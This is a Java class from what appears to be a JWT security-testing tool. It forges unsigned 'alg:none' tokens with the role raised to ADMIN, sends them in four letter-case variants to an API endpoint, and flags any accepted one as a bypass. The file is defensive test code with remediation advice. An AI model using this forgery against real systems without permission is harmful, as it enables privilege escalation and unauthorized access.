package rs.raf.bvs.jwttool.attacks;

import org.json.JSONObject;
import rs.raf.bvs.jwttool.http.ApiClient;
import rs.raf.bvs.jwttool.jwt.JwtCodec;
import rs.raf.bvs.jwttool.jwt.JwtParts;

// classic CVE-2015-9235, some libraries honored alg:none and skipped signature verification
// we test 4 letter-case variants to catch case-insensitive comparison bugs; java-jwt rejects this
public final class A4_AlgNoneAttack implements Attack {

    // 4 variants of "none" in case of a case-mismatch bug
    private static final String[] ALG_VARIANTS = {"none", "None", "NONE", "nOnE"};

    @Override
    public AttackResult run(AttackContext ctx) throws Exception {
        AttackResult r = new AttackResult("Attack 4 - Algorithm Confusion (alg:none)");

        if (ctx.getToken() == null) {
            r.fail("No token.");
            return r;
        }

        // payload role = ADMIN, we send it with an alg:none header and no signature segment
        JwtParts orig = JwtCodec.split(ctx.getToken());
        JSONObject payload = new JSONObject(orig.payload.toString());
        payload.put("role", "ADMIN");
        String payloadB64 = JwtCodec.b64UrlEncode(payload.toString());

        String path;
        if (ctx.getTestEndpoint() != null) {
            path = ctx.getTestEndpoint();
        } else {
            path = "/users";
        }

        boolean anySucceeded = false;
        for (int i = 0; i < ALG_VARIANTS.length; i++) {
            String alg = ALG_VARIANTS[i];
            JSONObject header = new JSONObject().put("alg", alg).put("typ", "JWT");
            String headerB64 = JwtCodec.b64UrlEncode(header.toString());
            // third segment empty, that is the point of the alg:none attack
            String token = JwtCodec.assemble(headerB64, payloadB64, "");

            ApiClient.HttpResult res = ctx.api().get(path, token);
            String marker;
            if (res.status == 200) {
                marker = "[BYPASS]";
            } else {
                marker = "[blocked]";
            }
            r.info("alg=\"" + alg + "\" -> HTTP " + res.status + "  " + marker);
            if (res.status == 200) {
                anySucceeded = true;
                r.warn("BYPASS succeeded with alg=" + alg);
                r.code("Forged token (no signature)", token);
            }
        }

        if (anySucceeded) {
            r.warn("Server accepts a token without a signature - CRITICAL. Fix: require HS256 explicitly.");
            r.setSuccess(false);
        } else {
            r.ok("All alg:none variants rejected -> com.auth0:java-jwt works (hardened since 3.x).");
            r.setSuccess(true);
        }

        r.setConclusion("Library defense is fine, but best practice: pin the algorithm explicitly in the verifier: JWT.require(Algorithm.HMAC256(secret)).");
        return r;
    }
}
